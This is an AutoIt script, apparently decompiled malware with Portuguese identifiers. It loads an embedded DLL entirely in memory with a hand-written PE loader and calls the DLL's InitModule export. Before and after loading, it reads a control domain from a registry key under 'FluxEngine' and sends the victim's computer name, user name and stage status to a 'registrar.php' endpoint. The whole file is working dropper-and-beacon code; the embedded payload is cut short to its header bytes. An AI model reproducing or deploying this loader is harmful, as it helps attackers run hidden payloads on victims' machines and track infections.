Global $G_HK32 = DllOpen ( "kernel32.dll" )
Global $G_PMODULE
Global $G_TMODULE
Func _PELOADER_OPEN ( $BPEDATA )
	Local $TPE = DllStructCreate ( "byte[" & BinaryLen ( $BPEDATA ) & "]" )
	DllStructSetData ( $TPE , 1 , $BPEDATA )
	Local $PPE = DllStructGetPtr ( $TPE )
	Local $TDOS = DllStructCreate ( "ushort e_magic;byte pad[58];dword e_lfanew" , $PPE )
	If DllStructGetData ( $TDOS , "e_magic" ) <> 23117 Then Return 0
	Local $PNT = $PPE + DllStructGetData ( $TDOS , "e_lfanew" )
	Local $TNT = DllStructCreate ( "dword Signature;ushort Machine;ushort NumberOfSections;dword TimeDateStamp;dword PointerToSymbolTable;dword NumberOfSymbols;ushort SizeOfOptionalHeader;ushort Characteristics" , $PNT )
	If DllStructGetData ( $TNT , "Signature" ) <> 17744 Then Return 0
	Local $POPT = $PNT + 24
	Local $TOPT = DllStructCreate ( "ushort Magic;byte pad[26];dword ImageBase;dword SectionAlignment;dword FileAlignment;byte pad2[16];dword SizeOfImage;dword SizeOfHeaders;byte pad3[4];ushort Subsystem;byte pad4[6];dword SizeOfStackReserve;dword SizeOfStackCommit;dword SizeOfHeapReserve;dword SizeOfHeapCommit;dword LoaderFlags;dword NumberOfRvaAndSizes" , $POPT )
	Local $IIMAGEBASE = DllStructGetData ( $TOPT , "ImageBase" )
	Local $ISIZEOFIMAGE = DllStructGetData ( $TOPT , "SizeOfImage" )
	Local $ISIZEOFHEADERS = DllStructGetData ( $TOPT , "SizeOfHeaders" )
	Local $INUMSECTIONS = DllStructGetData ( $TNT , "NumberOfSections" )
	Local $AVIRTALLOC = DllCall ( $G_HK32 , "ptr" , "VirtualAlloc" , "ptr" , $IIMAGEBASE , "dword" , $ISIZEOFIMAGE , "dword" , 12288 , "dword" , 64 )
	If $AVIRTALLOC [ 0 ] = 0 Then
		$AVIRTALLOC = DllCall ( $G_HK32 , "ptr" , "VirtualAlloc" , "ptr" , 0 , "dword" , $ISIZEOFIMAGE , "dword" , 12288 , "dword" , 64 )
	EndIf
	If $AVIRTALLOC [ 0 ] = 0 Then Return 0
	Local $PIMAGE = $AVIRTALLOC [ 0 ]
	DllCall ( $G_HK32 , "none" , "RtlMoveMemory" , "ptr" , $PIMAGE , "ptr" , $PPE , "dword" , $ISIZEOFHEADERS )
	Local $PSECTION = $POPT + DllStructGetData ( $TNT , "SizeOfOptionalHeader" )
	For $I = 1 To $INUMSECTIONS
		Local $TSECTION = DllStructCreate ( "byte Name[8];dword VirtualSize;dword VirtualAddress;dword SizeOfRawData;dword PointerToRawData;byte pad[16]" , $PSECTION )
		Local $IVA = DllStructGetData ( $TSECTION , "VirtualAddress" )
		Local $IRAWSIZE = DllStructGetData ( $TSECTION , "SizeOfRawData" )
		Local $IRAWPTR = DllStructGetData ( $TSECTION , "PointerToRawData" )
		If $IRAWSIZE > 0 Then
			DllCall ( $G_HK32 , "none" , "RtlMoveMemory" , "ptr" , $PIMAGE + $IVA , "ptr" , $PPE + $IRAWPTR , "dword" , $IRAWSIZE )
		EndIf
		$PSECTION += 40
	Next
	Local $PDATADIR = $POPT + 96
	Local $TRELOC = DllStructCreate ( "dword VirtualAddress;dword Size" , $PDATADIR + 40 )
	Local $IRELOCRVA = DllStructGetData ( $TRELOC , "VirtualAddress" )
	Local $IRELOCSIZE = DllStructGetData ( $TRELOC , "Size" )
	Local $IDELTA = $PIMAGE - $IIMAGEBASE
	If $IRELOCRVA > 0 And $IDELTA <> 0 Then
		Local $PRELOC = $PIMAGE + $IRELOCRVA
		Local $IPROCESSED = 0
		While $IPROCESSED < $IRELOCSIZE
			Local $TBLOCK = DllStructCreate ( "dword PageRVA;dword BlockSize" , $PRELOC )
			Local $IPAGERVA = DllStructGetData ( $TBLOCK , "PageRVA" )
			Local $IBLOCKSIZE = DllStructGetData ( $TBLOCK , "BlockSize" )
			If $IBLOCKSIZE = 0 Then ExitLoop
			Local $INUMENTRIES = ( $IBLOCKSIZE + 4294967288 ) / 2
			Local $PENTRIES = $PRELOC + 8
			For $J = 0 To $INUMENTRIES + 4294967295
				Local $TENTRY = DllStructCreate ( "ushort Value" , $PENTRIES + ( $J * 2 ) )
				Local $IENTRY = DllStructGetData ( $TENTRY , "Value" )
				Local $ITYPE = BitShift ( $IENTRY , 12 )
				Local $IOFFSET = BitAND ( $IENTRY , 4095 )
				If $ITYPE = 3 Then
					Local $PFIXUP = $PIMAGE + $IPAGERVA + $IOFFSET
					Local $TFIXUP = DllStructCreate ( "dword Value" , $PFIXUP )
					DllStructSetData ( $TFIXUP , "Value" , DllStructGetData ( $TFIXUP , "Value" ) + $IDELTA )
				EndIf
			Next
			$PRELOC += $IBLOCKSIZE
			$IPROCESSED += $IBLOCKSIZE
		WEnd
	EndIf
	Local $TIMPORT = DllStructCreate ( "dword VirtualAddress;dword Size" , $PDATADIR + 8 )
	Local $IIMPORTRVA = DllStructGetData ( $TIMPORT , "VirtualAddress" )
	If $IIMPORTRVA > 0 Then
		Local $PIMPORT = $PIMAGE + $IIMPORTRVA
		While True
			Local $TIMP = DllStructCreate ( "dword OriginalFirstThunk;dword TimeDateStamp;dword ForwarderChain;dword Name;dword FirstThunk" , $PIMPORT )
			Local $INAME = DllStructGetData ( $TIMP , "Name" )
			If $INAME = 0 Then ExitLoop
			Local $SDLLNAME = _PELOADER_READSTRING ( $PIMAGE + $INAME )
			Local $HDLL = DllCall ( $G_HK32 , "ptr" , "LoadLibraryA" , "str" , $SDLLNAME )
			If $HDLL [ 0 ] = 0 Then
				DllCall ( $G_HK32 , "bool" , "VirtualFree" , "ptr" , $PIMAGE , "dword" , 0 , "dword" , 32768 )
				Return 0
			EndIf
			Local $PTHUNK = $PIMAGE + DllStructGetData ( $TIMP , "FirstThunk" )
			Local $PORIGTHUNK = DllStructGetData ( $TIMP , "OriginalFirstThunk" )
			If $PORIGTHUNK = 0 Then $PORIGTHUNK = DllStructGetData ( $TIMP , "FirstThunk" )
			$PORIGTHUNK = $PIMAGE + $PORIGTHUNK
			While True
				Local $TTHUNK = DllStructCreate ( "dword Value" , $PORIGTHUNK )
				Local $ITHUNKVAL = DllStructGetData ( $TTHUNK , "Value" )
				If $ITHUNKVAL = 0 Then ExitLoop
				Local $PFUNC
				If BitAND ( $ITHUNKVAL , 2147483648 ) Then
					$PFUNC = DllCall ( $G_HK32 , "ptr" , "GetProcAddress" , "ptr" , $HDLL [ 0 ] , "ptr" , BitAND ( $ITHUNKVAL , 65535 ) )
				Else
					Local $SFUNCNAME = _PELOADER_READSTRING ( $PIMAGE + $ITHUNKVAL + 2 )
					$PFUNC = DllCall ( $G_HK32 , "ptr" , "GetProcAddress" , "ptr" , $HDLL [ 0 ] , "str" , $SFUNCNAME )
				EndIf
				Local $TFUNC = DllStructCreate ( "ptr Value" , $PTHUNK )
				DllStructSetData ( $TFUNC , "Value" , $PFUNC [ 0 ] )
				$PTHUNK += 4
				$PORIGTHUNK += 4
			WEnd
			$PIMPORT += 20
		WEnd
	EndIf
	Local $TDELAY = DllStructCreate ( "dword VirtualAddress;dword Size" , $PDATADIR + 104 )
	Local $IDELAYRVA = DllStructGetData ( $TDELAY , "VirtualAddress" )
	If $IDELAYRVA > 0 Then
		Local $PDELAY = $PIMAGE + $IDELAYRVA
		While True
			Local $TDEL = DllStructCreate ( "dword Attributes;dword DllNameRVA;dword ModuleHandleRVA;dword ImportAddressTableRVA;dword ImportNameTableRVA;dword BoundImportAddressTableRVA;dword UnloadInformationTableRVA;dword TimeDateStamp" , $PDELAY )
			Local $IDLLNAMERVA = DllStructGetData ( $TDEL , "DllNameRVA" )
			If $IDLLNAMERVA = 0 Then ExitLoop
			Local $SDLLNAME = _PELOADER_READSTRING ( $PIMAGE + $IDLLNAMERVA )
			Local $HDLL = DllCall ( $G_HK32 , "ptr" , "LoadLibraryA" , "str" , $SDLLNAME )
			If $HDLL [ 0 ] <> 0 Then
				Local $PIAT = $PIMAGE + DllStructGetData ( $TDEL , "ImportAddressTableRVA" )
				Local $PINT = $PIMAGE + DllStructGetData ( $TDEL , "ImportNameTableRVA" )
				While True
					Local $TINT = DllStructCreate ( "dword Value" , $PINT )
					Local $IINTVAL = DllStructGetData ( $TINT , "Value" )
					If $IINTVAL = 0 Then ExitLoop
					Local $PFUNC
					If BitAND ( $IINTVAL , 2147483648 ) Then
						$PFUNC = DllCall ( $G_HK32 , "ptr" , "GetProcAddress" , "ptr" , $HDLL [ 0 ] , "ptr" , BitAND ( $IINTVAL , 65535 ) )
					Else
						Local $SFUNCNAME = _PELOADER_READSTRING ( $PIMAGE + $IINTVAL + 2 )
						$PFUNC = DllCall ( $G_HK32 , "ptr" , "GetProcAddress" , "ptr" , $HDLL [ 0 ] , "str" , $SFUNCNAME )
					EndIf
					Local $TIAT = DllStructCreate ( "ptr Value" , $PIAT )
					DllStructSetData ( $TIAT , "Value" , $PFUNC [ 0 ] )
					$PIAT += 4
					$PINT += 4
				WEnd
			EndIf
			$PDELAY += 32
		WEnd
	EndIf
	Local $TOPTEP = DllStructCreate ( "byte pad[16];dword AddressOfEntryPoint" , $POPT )
	Local $IENTRYPOINT = DllStructGetData ( $TOPTEP , "AddressOfEntryPoint" )
	If $IENTRYPOINT > 0 Then
		Local $PENTRY = $PIMAGE + $IENTRYPOINT
		Local $ARET = DllCallAddress ( "bool" , $PENTRY , "ptr" , $PIMAGE , "dword" , 1 , "ptr" , 0 )
		If @error Or $ARET [ 0 ] = 0 Then
			DllCall ( $G_HK32 , "bool" , "VirtualFree" , "ptr" , $PIMAGE , "dword" , 0 , "dword" , 32768 )
			Return 0
		EndIf
	EndIf
	$G_PMODULE = $PIMAGE
	$G_TMODULE = $TPE
	Return $PIMAGE
EndFunc
Func _PELOADER_READSTRING ( $PSTR )
	Local $SRESULT = ""
	Local $I = 0
	While True
		Local $TCHAR = DllStructCreate ( "byte" , $PSTR + $I )
		Local $ICHAR = DllStructGetData ( $TCHAR , 1 )
		If $ICHAR = 0 Then ExitLoop
		$SRESULT &= Chr ( $ICHAR )
		$I += 1
		If $I > 255 Then ExitLoop
	WEnd
	Return $SRESULT
EndFunc
Func _PELOADER_GETPROCADDRESS ( $PMODULE , $SFUNCNAME )
	If $PMODULE = 0 Then Return 0
	Local $PNT = $PMODULE + DllStructGetData ( DllStructCreate ( "byte pad[60];dword" , $PMODULE ) , 2 )
	Local $PDATADIR = $PNT + 24 + 96
	Local $TEXPORT = DllStructCreate ( "dword VirtualAddress;dword Size" , $PDATADIR )
	Local $IEXPORTRVA = DllStructGetData ( $TEXPORT , "VirtualAddress" )
	If $IEXPORTRVA = 0 Then Return 0
	Local $PEXPORT = $PMODULE + $IEXPORTRVA
	Local $TEXPDIR = DllStructCreate ( "dword Characteristics;dword TimeDateStamp;ushort MajorVersion;ushort MinorVersion;dword Name;dword Base;dword NumberOfFunctions;dword NumberOfNames;dword AddressOfFunctions;dword AddressOfNames;dword AddressOfNameOrdinals" , $PEXPORT )
	Local $INUMNAMES = DllStructGetData ( $TEXPDIR , "NumberOfNames" )
	Local $PNAMES = $PMODULE + DllStructGetData ( $TEXPDIR , "AddressOfNames" )
	Local $PORDINALS = $PMODULE + DllStructGetData ( $TEXPDIR , "AddressOfNameOrdinals" )
	Local $PFUNCS = $PMODULE + DllStructGetData ( $TEXPDIR , "AddressOfFunctions" )
	For $I = 0 To $INUMNAMES + 4294967295
		Local $TNAMERVA = DllStructCreate ( "dword" , $PNAMES + ( $I * 4 ) )
		Local $SNAME = _PELOADER_READSTRING ( $PMODULE + DllStructGetData ( $TNAMERVA , 1 ) )
		If $SNAME = $SFUNCNAME Then
			Local $TORD = DllStructCreate ( "ushort" , $PORDINALS + ( $I * 2 ) )
			Local $IORD = DllStructGetData ( $TORD , 1 )
			Local $TFUNCRVA = DllStructCreate ( "dword" , $PFUNCS + ( $IORD * 4 ) )
			Return $PMODULE + DllStructGetData ( $TFUNCRVA , 1 )
		EndIf
	Next
	Return 0
EndFunc
Func _PELOADER_CLOSE ( $PMODULE )
	If $PMODULE = 0 Then Return
	Local $PNT = $PMODULE + DllStructGetData ( DllStructCreate ( "byte pad[60];dword" , $PMODULE ) , 2 )
	Local $TOPTEP = DllStructCreate ( "byte pad[16];dword AddressOfEntryPoint" , $PNT + 24 )
	Local $IENTRYPOINT = DllStructGetData ( $TOPTEP , "AddressOfEntryPoint" )
	If $IENTRYPOINT > 0 Then
		DllCallAddress ( "bool" , $PMODULE + $IENTRYPOINT , "ptr" , $PMODULE , "dword" , 0 , "ptr" , 0 )
	EndIf
	DllCall ( $G_HK32 , "bool" , "VirtualFree" , "ptr" , $PMODULE , "dword" , 0 , "dword" , 32768 )
	$G_PMODULE = 0
	$G_TMODULE = 0
EndFunc
Func _GETDOMINIO ( )
	Local $SKEY = "HKCU\Software\FluxEngine\Desktop"
	Local $SVAL = RegRead ( $SKEY , "src" )
	If @error Then Return ""
	Return $SVAL
EndFunc
Func _REPORTSTATUS ( $SSTATUS , $SMOTIVO = "" )
	Local $SDOMINIO = _GETDOMINIO ( )
	If $SDOMINIO = "" Then Return
	Local $SPC = EnvGet ( "COMPUTERNAME" )
	Local $SUSER = EnvGet ( "USERNAME" )
	Local $SURL = "https://" & $SDOMINIO & "/registrar.php?acao=log&status=" & $SSTATUS & "&pc=" & $SPC & "&user=" & $SUSER
	If $SMOTIVO <> "" Then $SURL &= "&motivo=" & $SMOTIVO
	Local $OERRHANDLER = ObjEvent ( "AutoIt.Error" , "_ErrFunc" )
	Local $OHTTP , $ITRY
	For $ITRY = 1 To 3
		$OHTTP = ObjCreate ( "WinHttp.WinHttpRequest.5.1" )
		If IsObj ( $OHTTP ) Then ExitLoop
		Sleep ( 2000 )
	Next
	If Not IsObj ( $OHTTP ) Then Return
	$OHTTP .Open ( "GET" , $SURL , False )
	$OHTTP .SetRequestHeader ( "User-Agent" , "Mozilla/5.0" )
	$OHTTP .SetTimeouts ( 5000 , 5000 , 5000 , 5000 )
	$OHTTP .Send ( )
	$OERRHANDLER = 0
EndFunc
Func _ERRFUNC ( $OERROR )
	Return
EndFunc
Global $DLLBINARY
Global $DLLBINARY
Func _LOADDLLDATA ( )
	$DLLBINARY = ""
	$DLLBINARY &= "0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000"
EndFunc
Func _AGUARDAINTERNET ( )
	Local $OERRHANDLER = ObjEvent ( "AutoIt.Error" , "_ErrFunc" )
	Local $OHTTP
	While True
		$OHTTP = ObjCreate ( "WinHttp.WinHttpRequest.5.1" )
		If IsObj ( $OHTTP ) Then
			$OHTTP .SetTimeouts ( 3000 , 3000 , 3000 , 3000 )
			$OHTTP .Open ( "GET" , "http://www.msftconnecttest.com/connecttest.txt" , False )
			$OHTTP .Send ( )
			If $OHTTP .Status = 200 Then
				$OERRHANDLER = 0
				Return
			EndIf
		EndIf
		Sleep ( 2000 )
	WEnd
EndFunc
Local $SBASEPATH = @ScriptDir & Chr ( 92 )
EnvSet ( "HOLLOW_DIR" , $SBASEPATH )
Sleep ( 5000 )
_AGUARDAINTERNET ( )
_REPORTSTATUS ( "au3_inicio" )
_LOADDLLDATA ( )
Local $PMODULE = _PELOADER_OPEN ( $DLLBINARY )
If $PMODULE = 0 Then
	_REPORTSTATUS ( "au3_falha" , "dll_load" )
	Exit 1
EndIf
_REPORTSTATUS ( "au3_dll_ok" )
Local $PINITMODULE = _PELOADER_GETPROCADDRESS ( $PMODULE , "InitModule" )
If $PINITMODULE = 0 Then
	_PELOADER_CLOSE ( $PMODULE )
	_REPORTSTATUS ( "au3_falha" , "no_initmodule" )
	Exit 1
EndIf
Local $ARESULT = DllCallAddress ( "int" , $PINITMODULE , "str" , $SBASEPATH )
If @error Or ( IsArray ( $ARESULT ) And Not $ARESULT [ 0 ] ) Then
	_REPORTSTATUS ( "au3_init_falha" , "retorno_0" )
	_PELOADER_CLOSE ( $PMODULE )
	Exit 1
EndIf
_REPORTSTATUS ( "au3_init_ok" )
Exit 0

